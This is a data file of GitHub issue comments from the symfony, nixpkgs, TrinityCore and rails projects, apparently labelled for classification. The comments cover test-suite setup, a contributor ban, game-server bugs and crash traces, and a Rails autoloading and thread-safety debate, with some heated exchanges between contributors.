symfony/symfony/5402/8188837,"you need to ask composer to install the dev dependencies too (used in the testsuite but not mandatory deps) by adding the --dev option when running the command. Btw, note that looking at the .travis.yml file allows to see what is needed to setup the testsuite (as it is the steps used to initialize it on Travis) ",,False,False,5402
symfony/symfony/5402/8188931,Information like this should not be hidden in JSON and YAML files. Now I have a different issue ➜  symfony git(master) composer install --dev    Installing dependencies from lock file Nothing to install or update Installing dev dependencies   - Installing phing/phing (2.4.12)     Downloading 100%             - Installing propel/propel1 (dev-master)     Cloning 6234fec72db2ad8fc0fe6e1ea6c1cd76abeeef5a    - Installing monolog/monolog (dev-master)     Cloning 1.2.1    - Installing doctrine/dbal (2.3.x-dev)     Cloning adb28e4e1f959d515971b8e8b7f05a01913a7b91    - Installing doctrine/orm (2.3.x-dev)     Cloning bbf527a27356414bfa9bf520f018c5cb7af67c77    - Installing doctrine/data-fixtures (v1.0.0-ALPHA2)     Downloading 100%           monolog/monolog suggests installing mlehner/gelf-php (Allow sending log messages to a GrayLog2 server) monolog/monolog suggests installing ext-amqp (Allow sending log messages to an AMQP server (1.0+ required)) monolog/monolog suggests installing ext-mongo (Allow sending log messages to a MongoDB server) doctrine/orm suggests installing symfony/yaml (If you want to use YAML Metadata Mapping Driver) Generating autoload files ➜  symfony git(master) phpunit                    Fatal error Cannot redeclare class Symfony\Component\Yaml\Tests\DumperTest in /usr/local/src/symfony/src/Symfony/Component/Yaml/Tests/DumperTest.php on line 161  Call Stack     0.0002     274984   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0757    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0757    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0757    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0974    3814688   5. PHPUnit_Util_Configuration-&gt;getTestSuiteConfiguration() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php666     0.0974    3816464   6. PHPUnit_Util_Configuration-&gt;getTestSuite() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php771     0.5300   11648312   7. PHPUnit_Framework_TestSuite-&gt;addTestFiles() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php855     6.5017  138748672   8. PHPUnit_Framework_TestSuite-&gt;addTestFile() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php417     6.5027  138749056   9. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php356     6.5027  138749336  10. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77  ,,False,False,5402
symfony/symfony/5402/8189040,This is weird. I don't find any duplicated class declaration for this test. Could it be possible that phpunit includes the file twice ? ,,False,False,5402
symfony/symfony/5402/8189235,this is not hidden ,,False,False,5402
symfony/symfony/5402/8189584,"True, I did not know about  Why? Because I expect this information in a  file in the repository. Oh, well. ",,False,False,5402
symfony/symfony/5402/8189613,@friend Could you send a PR updating the README file with your expected information? ,,False,False,5402
symfony/symfony/5402/8189709,"Less snark, more pull requests maybe, @friend? FWIW, I'd put this into a  file. ",,False,False,5402
symfony/symfony/5402/8189806,"I do not like your attitude, @friend. What you ""demand"" already happened. ",,False,False,5402
symfony/symfony/5402/8189908,"I do not like yours, either. I asked for feedback on PHPUnit 3.7RC. @friend replied mentioning an issue with Symfony. To research this issue I need to run the Symfony test suite. I ran into problems, I opened this ticket asking for help. And while others are helping ... you are attacking me for not contributing. ",,False,False,5402
symfony/symfony/5402/8189957,"Right, I'm not helping, I was just the first person who told you how to install the required dependencies (here and on Twitter). All of your comments this PR are unnecessarily passive-aggressive. If you don't see that, then figure out a way to get out of your bubble until you do please. ",,False,False,5402
symfony/symfony/5402/8190089,"Indeed, you helped in the beginning. Sorry that I forgot about that. I overreacted because of your ""Less snark, more pull requests maybe"" remark. At least to me, such a remark is offensive. I do not use Composer, Symfony, Travis, etc. This is why I ran into the original issue. For me it was clear from the beginning that I would send a pull request once I gathered all the information I needed, that's just what I do. If my comments came across as passive-aggressive or offended in any way my apologies. ",,False,False,5402
symfony/symfony/5402/8192265,"And finally, did you find a solution for your  issue @friend ? ",,False,False,5402
symfony/symfony/5402/8209936,"Yes, it was PHPUnit's fault ",,False,False,5402
symfony/symfony/5402/8210378,"@friend, I see that you require a few more Symfony files there, how does that work when we want to test the Yaml component with PHPUnit, wouldn't we test the classes that are in PEAR then? ",,False,False,5402
nixpkgs/NixOS/27244/241478644,"Issue description GitHub says ""You can't comment at this time."". Steps to reproduce Comment too much? ",,False,False,27244
nixpkgs/NixOS/27244/313880924,"I don't think so.  The conversation is unlocked and I haven't seen ability to block particular contributor-thread pairs.  Sometimes I got such errors transiently due to network failures.  Still, there might be stuff I've missed... ",,False,False,27244
nixpkgs/NixOS/27244/313881008,"@friend I just tried in another random thread opened by @friend and I suspect he has me on his blocked users list. I didn't know that was how the feature worked, but I suspect that's how it works. ",,False,False,27244
nixpkgs/NixOS/27244/313881044,"@friend As a consequence, he would also not see my @friend. So, if someone could ask him to reconsider would be swell. ",,False,False,27244
nixpkgs/NixOS/27244/313883740,"Ah, yes, that's probably what's happened. ",,False,False,27244
nixpkgs/NixOS/27244/314074359,"@friend, you have been blocked from the organization, due to your hostile behaviour towards contributors. ",,False,False,27244
nixpkgs/NixOS/27244/314224027,"@friend IMO @friend should be unbanned. He/she/they has a really strange and trollish way of talking, but there should be some warnings first, before ban. Perhaps he/she/they were warned already? @friend commenting on your opinion that looks... great! I've looked through some of his reviews, and all of them were on-topic. The way I see it, @friend has a constant 1y+ interest in Nixpkgs/NixOS projects and wants them to be improved, just like me. ",,False,False,27244
nixpkgs/NixOS/27244/314229230,"I'd personally think that raising this ticket and finding to be banned by an individual member should have been a warning by itself, and a day or two after that there was that ""final"" thread... ",,False,False,27244
nixpkgs/NixOS/27244/314296476,"I added this user to my personal block list almost exactly a year ago (2016-06-07), where I asked another person in the community to block them. At that time, I noted that they had recently been blocked by other major projects as well. At that time, I asked the other community member I messaged to review some other threads this user had been part of. This resulted in those threads being updated, to remove the nastiness. In my opinion, the most valuable thing we have put together is our welcoming and supportive community. Anything that jeopardizes that jeopardizes the future of NixOS. I don't volunteer my time here to be berated, and I don't think anyone else does, either. I love this community, I deeply appreciate all the hard work from all the hundreds of contributors, and absolutely support @friend's decision to remove people who make it unpleasant to be part of an otherwise top notch group. ",,False,False,27244
nixpkgs/NixOS/27244/314409794,Another instance of a negative conversation in a Pull Request ,,False,False,27244
TrinityCore/TrinityCore/16280/126999903,Branch  3.3.5 Commit  0316dff24530da83ef3466500ee8bd4e1af548ba When you are enter on trial of the crusader then start the event .  gormok the impaler comes inside the ring and stay ... nothing happened and he is not selectable and doesn't moving kill him with die and the snakes are same .  Dreadscale come in and the other one does not come up from the ground . before this i'm on  347373264b4ca5046af5c23378117e6ddb66504d  and everything works fine . ,,False,False,16280
TrinityCore/TrinityCore/16280/172159717,linking these to reference what you are talking about with the disables. ,,False,False,16280
TrinityCore/TrinityCore/16280/172159823,"@friend   it's already disabled in db , i'v encountered another issue with new commits . ",,False,False,16280
TrinityCore/TrinityCore/16280/172160157,"Like I said, I was just referencing what you were talking about. ",,False,False,16280
TrinityCore/TrinityCore/16280/172171408,Very likely bug on boundaries commit. ,,False,False,16280
TrinityCore/TrinityCore/16280/172216664,Started with 2da458c56d024aac04468ce2af454a83ad790bf6 Tested with the previous commit and all ok. ,,False,False,16280
TrinityCore/TrinityCore/16280/172260310,@friend since when exactly does Sindragosa have anything to do with Trial of The Crusader? ,,False,False,16280
TrinityCore/TrinityCore/16280/172260419,@friend realy stupid?This problem is boundaries system. ,,False,False,16280
TrinityCore/TrinityCore/16280/172261630,@friend it would be great if you could speak/write in a slightly more moderate tone. Those phrases you use aren't really appropriate for an issue tracker. I'm not sure how many people are willing to help you with such an attitude. Just my 2 cents... ,,False,False,16280
TrinityCore/TrinityCore/4603/2711445,"Hello, I have this crash recurrently  0  UnitIsImmunedToSpellEffect (this=0x7fff572a7000, spellInfo=0x7fffe8c8b800, index=0) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp11546     aura = 3     effect = &lt;value optimized out&gt;  1  0x0000000000b4d3d6 in SpellAddUnitTarget (this=0x7fff2cc61b00, target=0x7fff572a7000, effectMask=3, checkIfValid=&lt;value optimized out&gt;) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp956     targetGUID = &lt;value optimized out&gt;  2  0x0000000000b5f287 in SpellSelectEffectTargets (this=0x7fff2cc61b00, i=0, cur=...) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp2506     maxTargets = 0     pushType = PUSH_DST_CENTER     modOwner = 0x7fff7f44b000     effectMask = 3  3  0x0000000000b60577 in SpellSelectSpellTargets (this=0x7fff2cc61b00) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp717     implicitTargetMask = &lt;value optimized out&gt;     i = 0     processedTargets = 0  4  0x0000000000b61468 in Spellcast (this=0x7fff2cc61b00, skipCheck=true) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp3173  No locals. 5  0x0000000000b62b20 in SpellEventExecute (this=0x7fff2da38af0, e_time=2349594, p_time=0) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp6523  No locals. 6  0x0000000000ceba3f in EventProcessorUpdate (this=0x7fff7f44b280, p_time=342) at /home/game/origins/compil/darluok/src/server/shared/Utilities/EventProcessor.cpp47     Event = 0x7fff2da38af0  7  0x00000000008fb56c in UnitUpdate (this=0x7fff7f44b000, p_time=1462399696) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp302     __FUNCTION__ = ""Update""  8  0x000000000097e2d5 in PlayerUpdate (this=0x7fff7f44b000, p_time=342) at /home/game/origins/compil/darluok/src/server/game/Entities/Player/Player.cpp1542     now = &lt;value optimized out&gt;     pet = &lt;value optimized out&gt;  9  0x0000000000a641b6 in MapUpdate (this=0x7fffdfa5b000, t_diff=342) at /home/game/origins/compil/darluok/src/server/game/Maps/Map.cpp537     player = 0x7fff7f44b000     updater = {i_timeDiff = 342}     grid_object_update = {i_visitor = @friend}     world_object_update = {i_visitor = @friend}  10 0x0000000000a72381 in MapUpdateRequestcall() () No symbol table info available. 11 0x0000000000ce6911 in DelayExecutorsvc (this=0x7fffea3a3b40) at /home/game/origins/compil/darluok/src/server/shared/Threading/DelayExecutor.cpp52     rq = 0x7fff6efb3790  12 0x00007ffff76f1d47 in ACE_Task_Basesvc_run (args=&lt;value optimized out&gt;) at ../../ace/Task.cpp275     t = 0x7fffea3a3b40     svc_status = &lt;value optimized out&gt;  13 0x00007ffff76f30d1 in ACE_Thread_Adapterinvoke (this=0x7fffd6a1ed00) at ../../ace/Thread_Adapter.cpp98     exit_hook_instance = &lt;value optimized out&gt;     exit_hook_maybe = {instance_ = 0x0}     exit_hook_ptr = &lt;value optimized out&gt;  14 0x00007ffff5fa18ba in start_thread () from /lib/libpthread.so.0 No symbol table info available. 15 0x00007ffff5d0902d in clone () from /lib/libc.so.6 No symbol table info available. 16 0x0000000000000000 in ?? () No symbol table info available. Patch  wintergrasp Revision  57490ead833074bd83ae38be8ee50e9f9813759a ",,False,False,4603
TrinityCore/TrinityCore/4603/3341054,"I suggest a firewall (at least software) for your server, it's really vulnerable. ",,False,False,4603
TrinityCore/TrinityCore/4603/3341080,Why ? I didn't get the point. ,,False,False,4603
TrinityCore/TrinityCore/4603/3343803,Custom fixes or maybe a pull request implemented like for example the Immunity handling? ,,False,False,4603
TrinityCore/TrinityCore/4603/3343957,"No big custom fix, I've added some more immunities to Vehicles, but in the way Trinity dev have already done. ",,False,False,4603
TrinityCore/TrinityCore/4603/3343975,"do you know if I desactivate GCC optimisation, I will have the targetGUID and the spell/aura ID? ",,False,False,4603
TrinityCore/TrinityCore/4603/3343983,(and what is the relationship with a firewall...!?!) ,,False,False,4603
TrinityCore/TrinityCore/4603/3344003,I'm saying that your french private server doesn't have a firewall and it's easily crashable / hackable ;) ,,False,False,4603
TrinityCore/TrinityCore/4603/3344030,"/home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp Nothing more to be said.  «  francophones, gratuits &amp; légaux World of Warcraft »  PUBLIC SERVERS ARE ILLEGAL BY ESSENSE ",,False,False,4603
TrinityCore/TrinityCore/4603/3344355,Please shut up. Thanks. (~&gt;Mods) ,,False,False,4603
TrinityCore/TrinityCore/4603/3346232,no one appreciates that kind of attitude. the people here work hard to get these things working and most if not all private servers benefit from it without giving much if anything back in return. ,,False,False,4603
TrinityCore/TrinityCore/4603/3347984,"the most funny thing is they just know how to install a server and wait the money darluok, making money at it best. ",,False,False,4603
rails/rails/13142/23639400,"In Rails 3.x, the  config option was available for controlling whether autoloading was enabled as a fallback in case eager loading fails. This option has been removed from Rails in this commit e6747d87. The behaviour was changed so that autoload is disabled entirely when eager loading is enabled. This seems to make sense to me. However, in a8bf129, the initializer which disabled autoload when eager load is true was removed entirely. Now we're stuck with Rails behaving in a non-threadsafe way by default, which is possibly very difficult to detect. I realize I can add my own initializer to solve this problem, but if we're encouraging people to build threadsafe apps by default now, then it shouldn't require this level of knowledge to make Rails behave in a thread-safe way. The reasoning in a8bf129 seems flawed to me. Failing hard is a good thing, failing hard means subtle thread safety issues don't arise in a production environment sometimes because someone forgot a require somewhere. Thread safety is hard enough as it is. In my opinion, a8bf129 should be reverted. If this is deemed too aggressive, then maybe the  option should be reinstated, probably set to true by default, I can prepare a pull request for this if this is the preferred option. ",,False,False,13142
rails/rails/13142/29736103,"I remember that one of the issues that made a8bf129 is that people usually put lib in the autoload path, and since lib usually may have a lot of development/test only files these files will be loaded by default in production. In my opinion we should bring back ",,False,False,13142
rails/rails/13142/29736741,Between this was the biggest discussion in the history of the Rails core and seems we will start again smile ,,False,False,13142
rails/rails/13142/29744953,"@friend unfortunately both reverting a8bf129 and adding back  are problematic because the only way to really test it is live in production. However, Rails is still threadsafe by default because all the default autoload paths are eagerly loaded as well. The problem only appears when a developer adds a directory to  that is not eagerly loaded - typically this is the  folder. This folder often contains all sorts of junk and because of this it's not safe to eagerly load it by default as you would see strange errors when running in production by including development related code and libraries. The alternative of hard failing is unpalatable as it's often old apps with weaker test coverage that have added  to  and making these fail hard is something we decided after a lengthy discussion that we didn't want to do (93 messages and multiple Campfire discussions!). If developers follow our guidelines of not changing , adding directories to  for autoloading code and explicitly requiring code in  then Rails will be threadsafe. ",,False,False,13142
rails/rails/13142/29751578,Agree with @friend ,,False,False,13142
rails/rails/13142/29764665,"@friend Where are these guidelines documented? If changing autoload_paths is discouraged, then this should be documented somewhere, as far as I can tell, no such documentation exists. Ideally, manipulating the list of load paths should generate a warning. I know this is common cannon, but ""everyone knows this"" really doesn't cut it in terms of documentation. I'm worried by the fact that this whole reasoning builds on the fact that eager_load works perfectly, can we really guarantee that it does? With this in place, autoloading is still enabled, it could still be triggered, it could still create thread-safety problems. My experience with threaded programming is that you want to eliminate even the possibility of thread-safety issues if you can. ",,False,False,13142
rails/rails/13142/29779529,"@friend I thought we had something in Configuring Rails Applications but I may have been thinking of Ryan Bigg's guides. If there's nothing, then I will add something. We went through a list of possible scenarios about warning people - they all sucked in one way or another. Does eager loading work perfectly? Probably not as nothing is perfect but I know that it'll require every file in your  array which is as good as it's likely to get. We can't protect against people doing crazy stuff like requiring the same file in different threads so something may break. Our default position can't be to break people's apps in production after they've upgraded by disabling all code loading, so given that I've not seem any significant traffic on this topic since we've released Rails 4 I'm loathe to make changes to it. ",,False,False,13142
rails/rails/13142/29786379,"The thing that worries me is not so much that it misses a file, but rather that it misses a constant. There any number of ways an additional, undefined constant might pop up during request processing. What happens then? Since autoloading is still enabled, we'll still hit load_missing_constant, this methods uses a lot of global state. I have no idea what'll happen, maybe it works just fine because there is no possibility of anything being mutated, but I don't know the code well enough. ",,False,False,13142
rails/rails/13142/29786572,"By the way, we ended up calling  in an after_initialize block. IMO this is a good compromise, autoloading is enabled during the initialization process, which means all its convenience is there, and we don't have to worry too much about explicit requires. Since initialization is single-threaded this is safe. However, once we start processing requests, constants can no longer be autoloaded. Maybe I'm missing something, but this seems pretty safe to me. ",,False,False,13142
rails/rails/13142/29788440,"The scenario is that a developer has added  to  which is not eager loaded because it's full of junk you don't want in production like tasks, generators, etc. You then call  and start processing requests but a controller action not yet requested refers to an undefined constant and when it's reached it'll blow up. It's this that we want to prevent when upgrading Rails applications. ",,False,False,13142
rails/rails/13142/29831652,@friend what about adding  directory to brand new rails application? ,,False,False,13142
rails/rails/13142/29969951,You can add it now if you want and it'll work like any other app folder - I don't think we want to add it by default as a lot of apps have empty lib folders so adding another empty folder seems unnecessary. ,,False,False,13142
rails/rails/13142/30023960,"@friend you wrote this The problem is that in the case where an app is multi-threaded, and we don't switch off autoload, the case would be that it probably won't blow up, but random stuff will mysteriously sometimes fail in weird ways. So ask yourself this, what would you rather want, option 1) where you can get an exception at runtime, or option 2) where you get random, unpredictable, weird, hard to explain, difficult to debug bugs at runtime. Personally, I'm going to choose option 1. The downside of thread-safety issues is so much worse than the downside of the possibility of an exception. The way you're handling it makes it sound as though thread-safety is not important, as though Rails is still optimizing for the single-threaded case. That seems like a huge step back. ",,False,False,13142
rails/rails/13142/30083628,"Depends on the situation, would you prefer your highly traffic, e-commerce website to fail for all orders in the checkout or a small percentage of them. You may say option one but the accountant may say option 2. As long as the code you write is thread safe then you'll be fine. If it's not then whether we autoload or not isn't really going to save you if you don't know what you're doing as there are many ways to make code not thread safe - autoloading is just one of them. All Rails is doing is not facepunch-ing you with an exceptions when you upgrade - if you want to facepunch yourself by all means go ahead. smile I'm more than willing to accept a patch to the guides telling developers how to remove the autoloading but I think we have the right default given the amount of thought that went into making the decision. ",,False,False,13142
rails/rails/13142/30086439,"Who is going to run into a situation where all their orders fail and they don't notice? There are staging environments and smoke tests for these kinds of things. It's way more insidious and harder to notice when 0.1% of your orders fail as opposed to 100% of your orders failing. That's the point I'm trying to make. Failing hard is good. Especially with regards to thread safety. Also, honestly, you're telling me to go fuck myself? What kind of way is that of handling legitimate issues in an open source project? I don't think I've been discourteous in any way, I'm simply trying to get you to see my perspective on this. In 8 years in the Ruby community, I've never seen this much discussed shitty attitude we supposedly have, until today. I'm seriously very disappointed. ",,False,False,13142
rails/rails/13142/30086838,"Trust me, not every project has these kind of things - in an ideal world, yes, but we don't live in an ideal world. I think you've misinterpreted what I was trying to say - what I'm saying is that going for a hard fail is an aggressive choice. That may be your preference but we can't adopt it as a default, however I'm willing to accept changes to make it easier if a developer wishes be that aggressive in their own projects. If I caused offence, I'm sorry. ",,False,False,13142
rails/rails/13142/208904424,Should any one stumble upon this issue @friend reverted commit a8bf129 in  which is in v5.0.0.beta1 and later. ,,False,False,13142
rails/rails/13142/264807541,IMO auto-load should be disabled as a feature completely if it is not going to work. It is very frustrating for a new rail developer to read in documentation to add lib into auto_load list and then trying to deploy strange errors begin to happen. And auto_load can happily start raising an error that it is not supported and eaget_load needs to be used. This will not confuse anybody unlike present situation. It could be documented that lib can be added to eager_load instead which works fine in production env. ,,False,False,13142
rails/rails/13142/275416619,"As @friend mentioned above, the autoloader should be removed from Rails. It has never worked as advertised, and I do not see any chance of that thing ever working. In the past, it has demonstrated a complete misunderstanding of namespaces, injecting constants in wrong scopes and making it impossible to structure Rails projects without resorting to terminology from deep down the thesaurus. At the very least, the ""documentation"" should be amended to have a big and clear warning that relying on anything but top-level constants inside  being picked up will lead to problems. ",,False,False,13142
rails/rails/13142/275478305,"@friend actually one of the long-standing issues (which is a Ruby problem and not a Rails problem) where a top level constant is found because of  being in the ancestor chain of  and not  will be fixed in Ruby 2.5. In my experience with working on a range of apps developed by other teams, any problems with autoloading has been down to incorrect additions to autoload_paths - just use folders inside app for stuff that's eager/auto loaded and lib for things that are manually required. That and strict mapping of namespace hierarchy to path names eliminates 99.99% of problems. Autoloading in Rails is both the basis for eager loading in production and for reloading in development - I don't see the value in removing those features. If you want to manually control loading in your Rails app then it's perfectly possible to set up if you so desire, but it's not the default experience we want. ",,False,False,13142
rails/rails/13142/275492070,"@friend , I was not specific in my last comment. For me it was frustrating that autoloading worked perfectly well in dev env but not in production env. In production some classes in a deeper namespace were missing. I think the way I setup auto-load [1] must be correct because it worked in dev env. As soon as I run server (even locally) in production mode, it was giving troubles. It might have something to do with the issue you link to, because I have one class with same name in top namespace and under a module. Or maybe just in production  is using multiple workers. In any case, if autoloading is not recommended as it appears from this thread, then do not advertise it in documentation. As soon as I've put lib in the eager load list instead of the auto-load list, things started to work properly in production env. There is no official documentation listing the situations where autoloading might be an issue. I don't see how it makes sense to keep current situation - documentation advertises auto-loading, github thread discourages using it, there appears to be no incentive to fix auto-loading. The easiest solution is to at least update documentation to recommend eager loading instead of auto loading. I can't see any reason for not not doing this. [1] Here's how I actually do inside  ",,False,False,13142
rails/rails/13142/275549669,@friend the recommendation is to create app/lib and drag all those files that need to work with reloading/autoloading/eagerloading into there from lib and not touch the config at all. We've taken out the comment about autoload_paths from the generated application.rb so the only way someone will find it is if they go looking for it. Willing to accept a PR that places a great big warning in the relevant config section of the guide that basically says 'Here be dragons …' 😄 ,,False,False,13142
rails/rails/13142/275601252,"@friend , I'm neither so knowledgeable about rails internal nor so good with english to update the guide. IMO a simple adding of a warning would not help a lot. In the doc link I posted originally, there is a whole section about  and is mentioning auto-loading in various places. Very little is said about eager loading. Also in this guide, there is no mention of  nor google showed results when I was searching about . Do you know where is a good place to file an issue about the aforementioned guide? ",,False,False,13142
rails/rails/13142/276323251,"@friend, a mechanism that will inject top-level constants into modules is defective, and not due to a ""Ruby problem"". Case in point, we tried having a class . I literally had the following happen in a console &gt; AProcess == Process false &gt; AProcess == Process true  I am currently rewriting a medium-sized project to explicit loading of things in  (which is funny because something will still finger around in there before explicit loading and provoke constant re-assignment warnings…), and stumbled upon another instance where lookup would be similarly broken. This is not a Ruby problem! Plain Ruby does not arbitrarily screw up namespaces that badly; it takes a lot of work to create something as fragile and wrong. ",,False,False,13142
rails/rails/13142/276346895,@friend that's not what I see with a clean Rails app If you can reproduce your experience in a clean Rails app then please file a bug report. ,,False,False,13142
rails/rails/13142/296306044,"This is Bad.  The whole purpose of lib in the first place is to seperate non-domain-specific code from the app/ directory, which is domain specific. Rails seems to be content to violate established best practices regarding the division between lib/ and app/.  Messed up ",,False,False,13142
TrinityCore/TrinityCore/14120/57459083,"I couldn't find any other issue regarding this. I suppose this is a well known issue/exploit but I'll explain it briefly  Any Pet which can be commanded to attack (ie any warlock pet, hunter pet, frost mage pet,... etc) will go through walls and solid gobjects, mainly doors, to attack its objective.  This offers exploit opportunities to players such as starting combat with locked bosses and avoid doing the whole instance (ie Ymiron at Utgarde Pinnacle). hash c5dac48436c8a00d40640af9aecaaa71d549135a Using mmaps. ",,False,False,14120
rails/rails/13142/305373140,"@friend  so what would be your recommendation then? i do agree with you, that an external API wrapper should not be placed anywhere inside /app and personall i would rather see it in /lib ",,False,False,13142
rails/rails/13142/310066834,won't autoload. Rails 5.1 ,,False,False,13142
TrinityCore/TrinityCore/14120/74217692,"Walls or doors ? Because doors are ingame gameobjects spawned at runtime, walls are already present in client files and handled by MMAPs ",,False,False,14120
rails/rails/13142/319643402,Any link for best practise guidelines here? ,,False,False,13142
rails/rails/13142/330628038,"🙄 seems fine to move  inside . Just takes a minor adjustment in thinking, nbd. Alternatively, you could do what my coworker did and add  to  ♠¯_(ツ)_/¯` ",,False,False,13142
TrinityCore/TrinityCore/14120/74243652,"then it's a know old issue, mmaps don't take into account any dynamically spawned gameobject ",,False,False,14120
TrinityCore/TrinityCore/14120/74277714,well I just wanted to have it on an open issue ^^ ,,False,False,14120
TrinityCore/TrinityCore/14120/74327755,it has been a known issue for 2 years at least and it's going to be like that for 2 more years too ,,False,False,14120
TrinityCore/TrinityCore/14120/74369323,"It's not an attitude, it's the simple consequence of the limitations of recastnavigation. We already worked on this issue months ago, people before us tried too but no steps forward have been made (and I'm actually the only dev who fixed an issue in recast and got his PR accepted). You could study how recastnavigation works and see with your own eyes what l'm talking about. ",,False,False,14120
TrinityCore/TrinityCore/14120/74757606,"If anyone would like to mess with recast, here's an idea ",,False,False,14120
TrinityCore/TrinityCore/14120/182321976,"1 year passed, 1 left to go ",,False,False,14120
TrinityCore/TrinityCore/14120/182322504,"Not high anymore, with the new boundaries system from Treeston you can't pull ingvar anymore. ",,False,False,14120
TrinityCore/TrinityCore/14120/279225275,2 years passed! ding! ,,False,False,14120
TrinityCore/TrinityCore/14120/279250131,"@friend in IRC, you mentioned that there are 2 types of game objects  ""static game objects"" such as doors. They are created at exactly the same place each time they are spawned in the world. In other words, their location and geometry is known at build time. And then ""dynamic game objects"" which can be spawned on a new and unknown location each time they are loaded. Their location and geometry is only known at runtime.  The support of what I call ""dynamic game objects"" in the MMAPs would be a really cool feature. But is it even blizz-like? Are there cases where game objects are spawned at a new location on each game session? I don't think such feature is even possible considering the constraint of performance and memory space that TC has. If we were to only implement support of ""static"" game objects, it would be much simpler. Won't be easy game but I got my little idea on how to do it. ",,False,False,14120
TrinityCore/TrinityCore/14120/279333243,"I think we can implement features as incremental iterations, so handling doors would be nice and it will help understand how recast and detour work. We can worry about dynamic gameobjects later. ",,False,False,14120
TrinityCore/TrinityCore/14120/451174092,"@friend This is still an issue on  yes, mmaps, vmaps and all that stuff is enabled. not sure why it was closed as it never got fixed. ",,False,False,14120
TrinityCore/TrinityCore/1225/913219,"'''Armor''' Provided by Paladin (Devotion Aura), Shaman (Stoneskin Totem) ''Stacks'' '''5% Melee Critical Strike Chance''' Provided by Warrior (Rampage), Druid (Leader of the Pack) ''Stacks'' '''5% Spell Critical Strike Chance''' Provided by Druid (Moonkin Form), Shaman (Elemental Oath) ''Stack partially (but only for the Moonkin, who provides the aura)'' '''10% Attack Power''' Provided by DK (Abomination's Might), Hunter (Trueshot Aura), Shaman (Unleashed Rage) ''Stack partially (the same thing like 5% Spell-Crit, if there are for example 2 Hunters, the one who activate Trueshot Aura later get's 20% Attack Power)'' '''Mp5''' Provided by Shaman (Mana Spring Totem), Paladin (Blessing of Wisdom) ''Stacks'' '''Spell Power''' Provided by Warlock (Demonic Pact), Shaman (Totem of Wrath), Shaman (Flametongue Totem) ''Stack partially (Demonic Pact and Totem of Wrath/Flametongue Totem stacks, Totem of Wrath and Flametongue Totem does not stack)'' '''Healthpoints''' Provided by Warrior (Commanding Shout), Warlock (Blood Pact) ''Stacks'' '''Stats Multiplier''' Provided by Paladin (Blessing of King), Paladin (Blessing of Sanctuary) ''Stacks''  '''3% Damage''' Provided by Paladin (Sanctified Retribution), Mage (Arcane Empowerement), Hunter (Ferocious Inspiration) ''Does not Stack as far as i know, but not 100% sure'' '''10% Physical Damage Incoming''' Provided by Shaman (Ancestral Healing), Priest (Inspiration) ''Not tested yet'' '''3% Damage Incoming''' Provided by Paladin (Blessing of Sanctuary), Priest (Renewed Hope), Warrior (Vigiliance) ''Not tested yet'' '''5% Spell Haste''' Provided by Shaman (Wrath of Air Totem), Druid (Improved Moonkin Form) ''Not tested yet'' The rest work as intended as far as i know. I hope i can test the untested things soon, so i can update them. ",,False,False,1225
TrinityCore/TrinityCore/1225/1186049,"Author mark07 As you can read [ here], it's right that the armor bonus from Devotion Aura stacks with Stoneskin Totem. ",,False,False,1225
TrinityCore/TrinityCore/1225/1186050,Author kbinside half of things you write should stack. ,,False,False,1225
TrinityCore/TrinityCore/1225/1186052,"Author tehacy Please check your your Informations before writting such shit! When you're the opinion that someone made a fault, prove or at least explain why its wrong like mark07 (btw thanks for this information), but with this attitude please go trolling somewhere else. 5%crit shouldnt stack (physical and spell) -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  shouldnt stack -&gt;  Mulitplier shouldnt stack -&gt;  to explain it These two Buffs should both be able to stack on a Raidmember but because of the partially different buffs they offer, but the Strength and Stamina part shouldnt stack Spell Power shouldnt stack -&gt;  (only discribed, that Flametongue and Wrath shouldnt stack), but  you can read this Demonic Pact does not stack with an elemental Shaman's Totem of Wrath 3%! Haste (Not 5% - shame on me - wasnt focused enough) shouldnt stack -&gt;  Damage shouldnt stack -&gt;  Physical Damage Incoming shouldnt stack -&gt;  Damage Incoming shouldnt stack -&gt;  damage reduction from Blessing of Sanctuary, Renewed Hope and Vigilance does not stack. The buffs stack, because they have other effects - mana replenishment, threat transfer, etc. - but the 3% damage reduction buffs do not stack. It's this way for pretty much every buff buffs that do exactly the same thing as each other, tend not to stack. Exception Stoneskin totem &amp; devo aura."") So the same thing as Blessing of Sanctuary and Kings. The Armor-Buff was my fault. I didnt checked it and trusted a raidmember. ",,False,False,1225
TrinityCore/TrinityCore/1225/1425526,"It would be very nice, if u get this aura stacking fixed. ",,False,False,1225
TrinityCore/TrinityCore/1225/8932030,Updated at  #7667 ,,False,False,1225
TrinityCore/TrinityCore/7994/7401247,"When you use addons like Gladius and enter to an arena before your teammates, they appear in Gladius like they were your enemies. Also happens with blizzard arena frames. Same problem ♢  rev. 2012-10-05 233116 +0200 (ca55807+) (Unix, Release) ",,False,False,7994
TrinityCore/TrinityCore/7994/10983690,Confirmed! Revision a7d8a65bd0a95f21f1e350cefbef94ace20f69ec Database TDB.335.49 (with latest updates) ,,False,False,7994
TrinityCore/TrinityCore/7994/11040980,Confirmed! ,,False,False,7994
TrinityCore/TrinityCore/7994/11420849,Confirmed. ,,False,False,7994
TrinityCore/TrinityCore/7994/11431058,CONFIRMED! ,,False,False,7994
TrinityCore/TrinityCore/7994/12091349," will fix it, only makes sense that way anyway imo BattlegroundMgr.cpp ",,False,False,7994
